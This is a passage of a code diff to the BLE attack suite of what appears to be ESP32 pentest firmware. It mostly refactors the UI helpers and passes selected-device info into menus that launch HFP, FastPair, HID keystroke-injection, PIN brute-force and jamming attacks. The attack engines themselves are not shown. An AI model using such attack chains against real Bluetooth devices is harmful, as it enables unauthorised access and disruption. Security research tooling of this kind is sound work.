         "Test Vulnerability (CVE)", "Establish HFP Connection", "Full HFP Attack Chain", "HFP → HID Pivot"
     };
@@ -4237,7 +5043,7 @@ void showHFPSubMenu(NimBLEAddress target) {
     }
 }
 
-void showAudioSubMenu(NimBLEAddress target) {
+void showAudioSubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
     const char *options[] = {
         "AVRCP Media Control", "Audio Stack Crash", "Telephony Alert Test", "Run All Audio Tests"
     };
@@ -4276,7 +5082,7 @@ void showAudioSubMenu(NimBLEAddress target) {
     NimBLEDevice::deleteClient(pClient);
 }
 
-void showHIDSubMenu(NimBLEAddress target) {
+void showHIDSubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
     const char *options[] = {
         "Test HID Vulnerability",
         "Force HID Connection",
@@ -4292,22 +5098,9 @@ void showHIDSubMenu(NimBLEAddress target) {
     HIDExploitEngine hid;
     HIDDuckyService ducky;
 
-    String deviceName = "";
-    int rssi = -60;
-    if (xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-        for (size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
-            if (scannerData.deviceAddresses[i] == target.toString().c_str()) {
-                deviceName = scannerData.deviceNames[i];
-                rssi = scannerData.deviceRssi[i];
-                break;
-            }
-        }
-        xSemaphoreGive(scannerData.mutex);
-    }
-
     switch (choice) {
         case 0: hid.testHIDVulnerability(target); break;
-        case 1: hid.forceHIDConnection(target, deviceName, rssi); break;
+        case 1: hid.forceHIDConnection(target, deviceInfo.name, deviceInfo.rssi); break;
         case 2: HIDAttackServiceClass().injectKeystrokes(target); break;
         case 3: {
             String script = getScriptFromUser();
@@ -4315,7 +5108,7 @@ void showHIDSubMenu(NimBLEAddress target) {
             break;
         }
         case 4: {
-            HIDDeviceProfile profile = hid.analyzeHIDDevice(target, deviceName, rssi);
+            HIDDeviceProfile profile = hid.analyzeHIDDevice(target, deviceInfo.name, deviceInfo.rssi);
             if (profile.isAppleDevice) hid.tryAppleMagicSpoof(target, profile);
             else if (profile.isWindowsDevice) hid.tryWindowsHIDBypass(target, profile);
             else if (profile.isAndroidDevice) hid.tryAndroidJustWorks(target, profile);
@@ -4323,13 +5116,13 @@ void showHIDSubMenu(NimBLEAddress target) {
         }
         case 5:
             hid.testHIDVulnerability(target);
-            hid.forceHIDConnection(target, deviceName, rssi);
+            hid.forceHIDConnection(target, deviceInfo.name, deviceInfo.rssi);
             HIDAttackServiceClass().injectKeystrokes(target);
             break;
     }
 }
 
-void showMemorySubMenu(NimBLEAddress target) {
+void showMemorySubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
     const char *options[] = {
         "FastPair Memory Corruption",
         "FastPair State Confusion",
@@ -4392,7 +5185,7 @@ void showMemorySubMenu(NimBLEAddress target) {
     NimBLEDevice::deleteClient(pClient);
 }
 
-void showDoSSubMenu(NimBLEAddress target) {
+void showDoSSubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
     const char *options[] = {
         "Connection Flood", "Advertising Spam", "Jam & Connect (NRF24)", "Protocol Fuzzer"
     };
@@ -4411,7 +5204,7 @@ void showDoSSubMenu(NimBLEAddress target) {
     }
 }
 
-void showPayloadSubMenu(NimBLEAddress target) {
+void showPayloadSubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
     const char *options[] = {"DuckyScript Injection", "PIN Brute Force", "Auth Bypass Suite"};
 
     int choice = showSubMenu("Payload Delivery", options, 3);
@@ -4428,7 +5221,7 @@ void showPayloadSubMenu(NimBLEAddress target) {
     }
 }
 
-void showTestingSubMenu(NimBLEAddress target) {
+void showTestingSubMenu(NimBLEAddress target, SelectedDevice deviceInfo) {
     const char *options[] = {
         "Write Access Test", "Audio Control Test", "Protocol Fuzzer", "HID Service Test"
     };
@@ -4445,39 +5238,24 @@ void showTestingSubMenu(NimBLEAddress target) {
 }
 
 //=============================================================================
-// Attack Functions
+// Attack Functions - Updated to use SelectedDevice
 //=============================================================================
 
-void runUniversalAttack(NimBLEAddress target) {
+void runUniversalAttack(NimBLEAddress target, SelectedDevice deviceInfo) {
     AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
 
     if (!confirmAttack("Execute universal attack chain (HFP + HID + FastPair)?")) return;
 
-    String deviceName = "";
-    bool hasHFP = false, hasFastPair = false;
-
-    if (xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-        for (size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
-            if (scannerData.deviceAddresses[i] == target.toString().c_str()) {
-                deviceName = scannerData.deviceNames[i];
-                hasHFP = scannerData.deviceHasHFP[i];
-                hasFastPair = scannerData.deviceFastPair[i];
-                break;
-            }
-        }
-        xSemaphoreGive(scannerData.mutex);
-    }
-
     std::vector<String> lines = {
         "UNIVERSAL ATTACK CHAIN",
-        "Device: " + deviceName,
-        "HFP: " + String(hasHFP ? "YES" : "NO"),
-        "FastPair: " + String(hasFastPair ? "YES" : "NO")
+        "Device: " + deviceInfo.name,
+        "HFP: " + String(deviceInfo.hasHFP ? "YES" : "NO"),
+        "FastPair: " + String(deviceInfo.hasFastPair ? "YES" : "NO")
     };
 
     bool hfpSuccess = false, fpSuccess = false, hidSuccess = false;
 
-    if (hasHFP) {
+    if (deviceInfo.hasHFP) {
         showAttackProgress("Phase 1: Testing HFP vulnerability...", TFT_CYAN);
         HFPExploitEngine hfp;
         hfpSuccess = hfp.executeHFPAttackChain(target);
@@ -4491,7 +5269,7 @@ void runUniversalAttack(NimBLEAddress target) {
         }
     }
 
-    if (hasFastPair && (!hfpSuccess || !hidSuccess)) {
+    if (deviceInfo.hasFastPair && (!hfpSuccess || !hidSuccess)) {
         showAttackProgress("Phase 3: Testing FastPair vulnerability...", TFT_BLUE);
         FastPairExploitEngine fpEngine;
         fpSuccess = fpEngine.testVulnerability(target);
@@ -4509,25 +5287,14 @@ void runUniversalAttack(NimBLEAddress target) {
     }
 }
 
-void runQuickTest(NimBLEAddress target) {
+void runQuickTest(NimBLEAddress target, SelectedDevice deviceInfo) {
     AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
 
     showAttackProgress("Quick testing (HFP + FastPair)...", TFT_WHITE);
 
-    bool hasHFP = false;
-    if (xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
-        for (size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
-            if (scannerData.deviceAddresses[i] == target.toString().c_str()) {
-                hasHFP = scannerData.deviceHasHFP[i];
-                break;
-            }
-        }
-        xSemaphoreGive(scannerData.mutex);
-    }
-
     std::vector<String> results;
 
-    if (hasHFP) {
+    if (deviceInfo.hasHFP) {
         HFPExploitEngine hfp;
         bool hfpVulnerable = hfp.testCVE202536911(target);
         results.push_back("HFP (CVE-2025-36911): " + String(hfpVulnerable ? "VULNERABLE" : "SAFE"));
@@ -4548,7 +5315,7 @@ void runQuickTest(NimBLEAddress target) {
 
     cleanup.disable();
 
-    if (hasHFP && results[0].indexOf("VULNERABLE") != -1) {
+    if (deviceInfo.hasHFP && results[0].indexOf("VULNERABLE") != -1) {
         lines.push_back("Try HFP-based attacks first!");
         showDeviceInfoScreen("VULNERABLE DEVICE", lines, TFT_ORANGE, TFT_BLACK);
     } else if (fpVulnerable) {
@@ -4558,7 +5325,7 @@ void runQuickTest(NimBLEAddress target) {
     }
 }
 
-void runDeviceProfiling(NimBLEAddress target) {
+void runDeviceProfiling(NimBLEAddress target, SelectedDevice deviceInfo) {
     AutoCleanup cleanup([]() { BLEStateManager::deinitBLE(true); });
 
     if (!confirmAttack("Profile device services?")) return;
@@ -4778,13 +5545,14 @@ void runAudioControlTest(NimBLEAddress target) {
     while (!exitSubmenu) {
         if (selectedTest != lastSelected) {
             tft.fillScreen(bruceConfig.bgColor);
+            TouchFooter();
             tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
 
             tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-            tft.setTextSize(2);
+            tft.setTextSize(FM);
             tft.setCursor((tftWidth - tft.textWidth("AUDIO CONTROL TEST")) / 2, 15);
             tft.print("AUDIO CONTROL TEST");
-            tft.setTextSize(1);
+            tft.setTextSize(FP);
 
             tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
             tft.setCursor(20, 60);
@@ -4814,9 +5582,11 @@ void runAudioControlTest(NimBLEAddress target) {
                 tft.print(displayName);
             }
 
-            tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-            tft.setCursor(20, tftHeight - 35);
-            tft.print("SEL: Test  PREV/NEXT: Navigate  ESC: Back");
+            tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
+            tft.setCursor(20, tftHeight - 30);
+            tft.print("SEL: Select  PREV/NEXT: Navigate");
+            tft.setCursor(20, tftHeight - 20);
+            tft.print("ESC: Back");
 
             lastSelected = selectedTest;
         }
@@ -4936,215 +5706,100 @@ void runHFPHIDPivotAttack(NimBLEAddress target) {
 }
 
 //=============================================================================
-// UI Helpers - with text wrapping for long messages
+// UI Helpers
 //=============================================================================
 
-void showAttackProgress(const char *message, uint16_t color) {
-    tft.fillScreen(bruceConfig.bgColor);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth("BLE SUITE")) / 2, 15);
-    tft.print("BLE SUITE");
-    tft.setTextSize(1);
-
-    tft.setTextColor(color, bruceConfig.bgColor);
-
-    String msg = message;
-    int maxWidth = tftWidth - 40;
-    int lineHeight = 20;
-    int yPos = 80;
+// Wraps `text` inside the list area, measuring glyphs rather than assuming a
+// 6px cell. Returns the y just past the last line drawn.
+static int bleWrapText(const String &text, int x, int y, int w, int bottom) {
+    tft.setTextSize(FP);
+    int lh = 8 * FP + 2;
     int start = 0;
-    int len = msg.length();
-
-    while (start < len) {
-        int end = start;
-        int lastSpace = -1;
-
-        while (end < len && (end - start) * 6 < maxWidth) {
-            if (msg.charAt(end) == ' ') lastSpace = end;
+    const int len = text.length();
+    while (start < len && y + lh <= bottom) {
+        int end = start, lastSpace = -1;
+        while (end < len) {
+            if (text.charAt(end) == ' ') lastSpace = end;
+            if (tft.textWidth(text.substring(start, end + 1).c_str()) > w) break;
             end++;
         }
+        int cut = (end >= len) ? len : (lastSpace > start ? lastSpace : end);
+        tft.drawString(text.substring(start, cut), x, y, 1);
+        y += lh;
+        start = (cut < len && text.charAt(cut) == ' ') ? cut + 1 : cut;
+    }
+    return y;
+}
 
-        if (end == len || lastSpace == -1) {
-            tft.setCursor(20, yPos);
-            tft.print(msg.substring(start, end));
-            start = end;
-        } else {
-            tft.setCursor(20, yPos);
-            tft.print(msg.substring(start, lastSpace));
-            start = lastSpace + 1;
-        }
-        yPos += lineHeight;
-        if (yPos > tftHeight - 60) break;
+void showAttackProgress(const char *message, uint16_t color) {
+    BleUiGeom g = bleUiGeom();
+    static uint8_t spinnerPos = 0;
+    static String lastMsg;
+    String msg = message ? String(message) : String("");
+
+    // Only repaint the frame when the message actually changes; the spinner
+    // used to be redrawn under a full-screen clear, so it flashed instead of
+    // turning.
+    if (msg != lastMsg) {
+        lastMsg = msg;
+        drawMainBorderWithTitle("BLE Suite");
+        // same reasoning as the results screen: the caller's colour is a hint,
+        // not something to paint text with
+        tft.setTextColor(bleSeverity(color), bruceConfig.bgColor);
+        bleWrapText(msg, g.listL, g.top, g.listW - 12, g.footY - 2);
+        tft.setTextColor(bleDim(), bruceConfig.bgColor);
+        tft.drawString("working...", g.listL, g.footY, 1);
     }
 
-    static uint8_t spinnerPos = 0;
     const char *spinner = "|/-\\";
-    tft.setCursor(tftWidth - 40, 80);
-    tft.print(spinner[spinnerPos % 4]);
-    spinnerPos++;
-
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setCursor(20, tftHeight - 30);
-    tft.print("Please wait...");
+    tft.setTextSize(FP);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.drawString(String(spinner[spinnerPos++ % 4]), g.listL + g.listW - FP * LW, g.footY, 1);
 }
 
 void showAttackResult(bool success, const char *message) {
-    if (success) {
-        tft.fillScreen(TFT_GREEN);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-        tft.setTextColor(TFT_WHITE, TFT_GREEN);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("SUCCESS")) / 2, 15);
-        tft.print("SUCCESS");
-        tft.setTextSize(1);
-        tft.setTextColor(TFT_BLACK, TFT_GREEN);
-    } else {
-        tft.fillScreen(TFT_RED);
-        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-        tft.setTextColor(TFT_WHITE, TFT_RED);
-        tft.setTextSize(2);
-        tft.setCursor((tftWidth - tft.textWidth("FAILED")) / 2, 15);
-        tft.print("FAILED");
-        tft.setTextSize(1);
-        tft.setTextColor(TFT_WHITE, TFT_RED);
-    }
-
-    tft.setTextColor(success ? TFT_BLACK : TFT_WHITE, success ? TFT_GREEN : TFT_RED);
-
-    if (message) {
-        String msg = message;
-        int maxWidth = tftWidth - 40;
-        int lineHeight = 20;
-        int yPos = 80;
-        int start = 0;
-        int len = msg.length();
-
-        while (start < len) {
-            int end = start;
-            int lastSpace = -1;
-
-            while (end < len && (end - start) * 6 < maxWidth) {
-                if (msg.charAt(end) == ' ') lastSpace = end;
-                end++;
-            }
-
-            if (end == len || lastSpace == -1) {
-                tft.setCursor(20, yPos);
-                tft.print(msg.substring(start, end));
-                start = end;
-            } else {
-                tft.setCursor(20, yPos);
-                tft.print(msg.substring(start, lastSpace));
-                start = lastSpace + 1;
-            }
-            yPos += lineHeight;
-            if (yPos > tftHeight - 100) break;
-        }
-    } else {
-        tft.setCursor(20, 80);
-        tft.print(success ? "Attack successful!" : "Attack failed");
-    }
-
-    tft.setTextColor(TFT_WHITE, success ? TFT_GREEN : TFT_RED);
-    tft.setCursor(20, tftHeight - 35);
-    tft.print("SEL: Continue  ESC: Back");
-
-    while (!check(SelPress) && !check(EscPress)) delay(50);
-    delay(200);
+    String msg = message ? String(message) : String(success ? "Attack successful" : "Attack failed");
+    if (success) displaySuccess(msg, true);
+    else displayError(msg, true);
 }
 
 bool confirmAttack(const char *targetName) {
-    tft.fillScreen(bruceConfig.bgColor);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
+    BleUiGeom g = bleUiGeom();
+    drawMainBorderWithTitle("Confirm Attack");
+    tft.setTextSize(FP);
 
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth("CONFIRM ATTACK")) / 2, 15);
-    tft.print("CONFIRM ATTACK");
-    tft.setTextSize(1);
-
-    tft.setCursor(20, 60);
-    tft.print("Target: ");
-
-    String targetStr = targetName;
-    if (targetStr.length() > 30) {
-        tft.println(targetStr.substring(0, 27) + "...");
-    } else {
-        tft.println(targetStr);
+    tft.setTextColor(bleDim(), bruceConfig.bgColor);
+    tft.drawString("Target", g.listL, g.top, 1);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    tft.drawString(bleFit(String(targetName), g.listW), g.listL, g.top + g.rowH, 1);
+    if (g_selectedDevice.name.length() && !g_selectedDevice.name.equalsIgnoreCase(targetName)) {
+        tft.drawString(bleFit(g_selectedDevice.name, g.listW), g.listL, g.top + 2 * g.rowH, 1);
     }
 
-    tft.setCursor(20, 90);
-    tft.println("FastPair buffer overflow exploit");
+    tft.setTextColor(bleDim(), bruceConfig.bgColor);
+    tft.drawString("SEL yes   NEXT/ESC no", g.listL, g.footY, 1);
 
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setCursor(20, tftHeight - 35);
-    tft.print("SEL: Yes  NEXT: No  ESC: Cancel");
-
-    while (true) {
-        if (check(EscPress)) return false;
+    for (;;) {
+        if (check(EscPress) || check(NextPress)) return false;
         if (check(SelPress)) return true;
-        if (check(NextPress)) return false;
-        delay(50);
+        vTaskDelay(20 / portTICK_PERIOD_MS);
     }
 }
 
 bool requireSimpleConfirmation(const char *message) {
-    tft.fillScreen(bruceConfig.bgColor);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
+    BleUiGeom g = bleUiGeom();
+    drawMainBorderWithTitle("Confirm");
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    bleWrapText(String(message), g.listL, g.top, g.listW - 12, g.footY - 2);
 
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth("CONFIRM")) / 2, 15);
-    tft.print("CONFIRM");
-    tft.setTextSize(1);
+    tft.setTextSize(FP);
+    tft.setTextColor(bleDim(), bruceConfig.bgColor);
+    tft.drawString("SEL yes   NEXT/ESC no", g.listL, g.footY, 1);
 
-    tft.fillRect(20, 50, tftWidth - 40, 80, bruceConfig.bgColor);
-    tft.setCursor(20, 60);
-    String msgStr = message;
-
-    int maxWidth = tftWidth - 40;
-    int lineHeight = 20;
-    int yPos = 60;
-    int start = 0;
-    int len = msgStr.length();
-
-    while (start < len) {
-        int end = start;
-        int lastSpace = -1;
-
-        while (end < len && (end - start) * 6 < maxWidth) {
-            if (msgStr.charAt(end) == ' ') lastSpace = end;
-            end++;
-        }
-
-        if (end == len || lastSpace == -1) {
-            tft.setCursor(20, yPos);
-            tft.print(msgStr.substring(start, end));
-            start = end;
-        } else {
-            tft.setCursor(20, yPos);
-            tft.print(msgStr.substring(start, lastSpace));
-            start = lastSpace + 1;
-        }
-        yPos += lineHeight;
-        if (yPos > 130) break;
-    }
-
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setCursor(20, tftHeight - 35);
-    tft.print("SEL: OK  ESC: Cancel");
-
-    while (true) {
-        if (check(EscPress)) {
-            showAttackProgress("Cancelled", TFT_WHITE);
-            delay(1000);
-            return false;
-        }
+    for (;;) {
+        if (check(EscPress) || check(NextPress)) return false;
         if (check(SelPress)) return true;
-        delay(50);
+        vTaskDelay(20 / portTICK_PERIOD_MS);
     }
 }
 
@@ -5152,320 +5807,120 @@ int8_t showAdaptiveMessage(
     const char *line1, const char *btn1, const char *btn2, const char *btn3, uint16_t color, bool showEscHint,
     bool autoProgress
 ) {
+    // The hint line used to be drawn with TFT_BLACK on the theme background,
+    // i.e. invisible on every dark theme, and the body wrapped against a
+    // hardcoded y = 140 ceiling.
+    (void)showEscHint;
     int buttonCount = 0;
     if (strlen(btn1) > 0) buttonCount++;
     if (strlen(btn2) > 0) buttonCount++;
     if (strlen(btn3) > 0) buttonCount++;
 
-    tft.fillScreen(bruceConfig.bgColor);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth("MESSAGE")) / 2, 15);
-    tft.print("MESSAGE");
-    tft.setTextSize(1);
+    BleUiGeom g = bleUiGeom();
+    const uint16_t sev = bleSeverity(color);
+    const int barW = 3;
+    const int textX = g.listL + barW + 4;
 
-    tft.setTextColor(color, bruceConfig.bgColor);
+    drawMainBorderWithTitle("BLE Suite");
+    tft.fillRect(g.listL, g.top - 2, barW, g.rows * g.rowH, sev);
 
-    String lineStr = line1;
-    int maxWidth = tftWidth - 40;
-    int lineHeight = 20;
-    int yPos = 70;
-    int start = 0;
-    int len = lineStr.length();
-
-    while (start < len) {
-        int end = start;
-        int lastSpace = -1;
-
-        while (end < len && (end - start) * 6 < maxWidth) {
-            if (lineStr.charAt(end) == ' ') lastSpace = end;
-            end++;
-        }
-
-        if (end == len || lastSpace == -1) {
-            tft.setCursor(20, yPos);
-            tft.print(lineStr.substring(start, end));
-            start = end;
-        } else {
-            tft.setCursor(20, yPos);
-            tft.print(lineStr.substring(start, lastSpace));
-            start = lastSpace + 1;
-        }
-        yPos += lineHeight;
-        if (yPos > 140) break;
+    std::vector<String> rows;
+    bleWrapInto(String(line1), g.listW - barW - 4, rows);
+    tft.setTextSize(FP);
+    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+    for (int i = 0; i < g.rows && i < (int)rows.size(); i++) {
+        tft.drawString(rows[i], textX, g.top + i * g.rowH, 1);
     }
 
-    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
-    tft.setCursor(20, tftHeight - 35);
+    String hint;
+    if (buttonCount == 0) hint = autoProgress ? "" : "any key to continue";
+    else if (buttonCount == 1) hint = String("SEL ") + btn1 + "   ESC cancel";
+    else {
+        hint = String("SEL ") + btn1 + "  NEXT " + btn2;
+        if (buttonCount > 2) hint += String("  PREV ") + btn3;
+        hint += "  ESC cancel";
+    }
+    tft.setTextColor(bleDim(), bruceConfig.bgColor);
+    tft.drawString(bleFit(hint, g.listW), g.listL, g.footY, 1);
 
-    if (buttonCount == 0) {
-        if (autoProgress) {
-            delay(1500);
-            return 0;
-        }
-        tft.print("Press any key to continue...");
-        while (true) {
-            if (check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
-                delay(200);
-                return 0;
-            }
-            delay(50);
-        }
-    } else if (buttonCount == 1) {
-        tft.print("SEL: Select  ESC: Cancel");
-        while (true) {
-            if (check(EscPress)) {
-                delay(200);
-                return -1;
-            }
-            if (check(SelPress)) {
-                delay(200);
-                return 0;
-            }
-            delay(50);
-        }
-    } else {
-        tft.print("SEL: Btn1  NEXT: Btn2  ESC: Cancel");
-        while (true) {
-            if (check(EscPress)) {
-                delay(200);
-                return -1;
-            }
-            if (check(SelPress)) {
-                delay(200);
-                return 0;
-            }
-            if (check(NextPress)) {
-                delay(200);
-                return 1;
-            }
-            if (buttonCount > 2 && check(PrevPress)) {
-                delay(200);
-                return 2;
-            }
-            delay(50);
-        }
+    if (buttonCount == 0 && autoProgress) {
+        delay(1500);
+        return 0;
+    }
+
+    for (;;) {
+        if (check(EscPress)) return buttonCount == 0 ? 0 : -1;
+        if (check(SelPress)) return 0;
+        if (buttonCount >= 2 && check(NextPress)) return 1;
+        if (buttonCount > 2 && check(PrevPress)) return 2;
+        if (buttonCount == 0 && (check(NextPress) || check(PrevPress))) return 0;
+        vTaskDelay(20 / portTICK_PERIOD_MS);
     }
 }
 
-void showWarningMessage(const char *message) {
-    tft.fillScreen(TFT_YELLOW);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth("WARNING")) / 2, 15);
-    tft.print("WARNING");
-    tft.setTextSize(1);
-    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
-    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_YELLOW);
+void showWarningMessage(const char *message) { displayWarning(String(message), true); }
 
-    String msgStr = message;
-    int maxWidth = tftWidth - 40;
-    int lineHeight = 20;
-    int yPos = 70;
-    int start = 0;
-    int len = msgStr.length();
+void showErrorMessage(const char *message) { displayError(String(message), true); }
 
-    while (start < len) {
-        int end = start;
-        int lastSpace = -1;
-
-        while (end < len && (end - start) * 6 < maxWidth) {
-            if (msgStr.charAt(end) == ' ') lastSpace = end;
-            end++;
-        }
-
-        if (end == len || lastSpace == -1) {
-            tft.setCursor(20, yPos);
-            tft.print(msgStr.substring(start, end));
-            start = end;
-        } else {
-            tft.setCursor(20, yPos);
-            tft.print(msgStr.substring(start, lastSpace));
-            start = lastSpace + 1;
-        }
-        yPos += lineHeight;
-        if (yPos > 160) break;
-    }
-
-    tft.setTextColor(TFT_BLACK, TFT_YELLOW);
-    tft.setCursor(20, tftHeight - 35);
-    tft.print("Press any key to continue...");
-
-    while (true) {
-        if (check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
-            delay(200);
-            return;
-        }
-        delay(50);
-    }
-}
-
-void showErrorMessage(const char *message) {
-    tft.fillScreen(TFT_RED);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-    tft.setTextColor(TFT_WHITE, TFT_RED);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth("ERROR")) / 2, 15);
-    tft.print("ERROR");
-    tft.setTextSize(1);
-    tft.setTextColor(TFT_WHITE, TFT_RED);
-    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_RED);
-
-    String msgStr = message;
-    int maxWidth = tftWidth - 40;
-    int lineHeight = 20;
-    int yPos = 70;
-    int start = 0;
-    int len = msgStr.length();
-
-    while (start < len) {
-        int end = start;
-        int lastSpace = -1;
-
-        while (end < len && (end - start) * 6 < maxWidth) {
-            if (msgStr.charAt(end) == ' ') lastSpace = end;
-            end++;
-        }
-
-        if (end == len || lastSpace == -1) {
-            tft.setCursor(20, yPos);
-            tft.print(msgStr.substring(start, end));
-            start = end;
-        } else {
-            tft.setCursor(20, yPos);
-            tft.print(msgStr.substring(start, lastSpace));
-            start = lastSpace + 1;
-        }
-        yPos += lineHeight;
-        if (yPos > 160) break;
-    }
-
-    tft.setCursor(20, tftHeight - 35);
-    tft.print("Press any key to continue...");
-
-    while (true) {
-        if (check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
-            delay(200);
-            return;
-        }
-        delay(50);
-    }
-}
-
-void showSuccessMessage(const char *message) {
-    tft.fillScreen(TFT_GREEN);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_BLACK);
-    tft.setTextColor(TFT_WHITE, TFT_GREEN);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth("SUCCESS")) / 2, 15);
-    tft.print("SUCCESS");
-    tft.setTextSize(1);
-    tft.setTextColor(TFT_BLACK, TFT_GREEN);
-    tft.fillRect(20, 60, tftWidth - 40, 100, TFT_GREEN);
-
-    String msgStr = message;
-    int maxWidth = tftWidth - 40;
-    int lineHeight = 20;
-    int yPos = 70;
-    int start = 0;
-    int len = msgStr.length();
-
-    while (start < len) {
-        int end = start;
-        int lastSpace = -1;
-
-        while (end < len && (end - start) * 6 < maxWidth) {
-            if (msgStr.charAt(end) == ' ') lastSpace = end;
-            end++;
-        }
-
-        if (end == len || lastSpace == -1) {
-            tft.setCursor(20, yPos);
-            tft.print(msgStr.substring(start, end));
-            start = end;
-        } else {
-            tft.setCursor(20, yPos);
-            tft.print(msgStr.substring(start, lastSpace));
-            start = lastSpace + 1;
-        }
-        yPos += lineHeight;
-        if (yPos > 160) break;
-    }
-
-    tft.setCursor(20, tftHeight - 35);
-    tft.print("Press any key to continue...");
-
-    while (true) {
-        if (check(EscPress) || check(SelPress) || check(PrevPress) || check(NextPress)) {
-            delay(200);
-            return;
-        }
-        delay(50);
-    }
-}
+void showSuccessMessage(const char *message) { displaySuccess(String(message), true); }
 
 void showDeviceInfoScreen(
     const char *title, const std::vector<String> &lines, uint16_t bgColor, uint16_t textColor
 ) {
-    tft.fillScreen(bgColor);
-    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);
+    // textColor is ignored on purpose: six call sites pass TFT_BLACK, which was
+    // legible only against the solid colour this screen used to flood the panel
+    // with. Body text now always uses the theme foreground, and the severity the
+    // caller meant to convey moves to a marker down the left edge.
+    (void)textColor;
 
-    tft.setTextColor(TFT_WHITE, bgColor);
-    tft.setTextSize(2);
-    tft.setCursor((tftWidth - tft.textWidth(title)) / 2, 15);
-    tft.print(title);
-    tft.setTextSize(1);
+    BleUiGeom g = bleUiGeom();
+    const uint16_t sev = bleSeverity(bgColor);
+    const int barW = 3;
+    const int textX = g.listL + barW + 4;
+    const int textW = g.listW - barW - 4;
 
-    tft.setTextColor(textColor, bgColor);
-    int yPos = 60;
-    int lineHeight = 20;
-    int maxLines = 8;
+    // Wrap everything up front so the screen can scroll instead of silently
+    // dropping whatever did not fit.
+    std::vector<String> rows;
+    for (size_t i = 0; i < lines.size(); i++) bleWrapInto(lines[i], textW, rows);
 
-    for (int i = 0; i < std::min((int)lines.size(), maxLines); i++) {
-        if (yPos + lineHeight > tftHeight - 45) break;
+    const int perPage = g.rows;
+    int off = 0, lastOff = -1;
 
-        String displayLine = lines[i];
-        int maxWidth = tftWidth - 40;
-        int lineY = yPos;
-        int start = 0;
-        int len = displayLine.length();
+    drawMainBorderWithTitle(title);
+    tft.fillRect(g.listL, g.top - 2, barW, perPage * g.rowH, sev);
 
-        while (start < len) {
-            int end = start;
-            int lastSpace = -1;
-
-            while (end < len && (end - start) * 6 < maxWidth) {
-                if (displayLine.charAt(end) == ' ') lastSpace = end;
-                end++;
+    for (;;) {
+        if (off != lastOff) {
+            lastOff = off;
+            tft.setTextSize(FP);
+            for (int i = 0; i < perPage; i++) {
+                int y = g.top + i * g.rowH;
+                tft.fillRect(textX, y - 2, textW, g.rowH, bruceConfig.bgColor);
+                size_t idx = (size_t)(off + i);
+                if (idx >= rows.size()) continue;
+                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+                tft.drawString(rows[idx], textX, y, 1);
             }
 
-            if (end == len || lastSpace == -1) {
-                tft.setCursor(20, lineY);
-                tft.print(displayLine.substring(start, end));
-                start = end;
-            } else {
-                tft.setCursor(20, lineY);
-                tft.print(displayLine.substring(start, lastSpace));
-                start = lastSpace + 1;
+            tft.fillRect(g.listL, g.footY, g.listW, 8 * FP, bruceConfig.bgColor);
+            bool more = (int)rows.size() > perPage;
+            tft.setTextColor(bleDim(), bruceConfig.bgColor);
+            tft.drawString(more ? "PREV/NEXT scroll  ESC back" : "SEL / ESC back", g.listL, g.footY, 1);
+            if (more) {
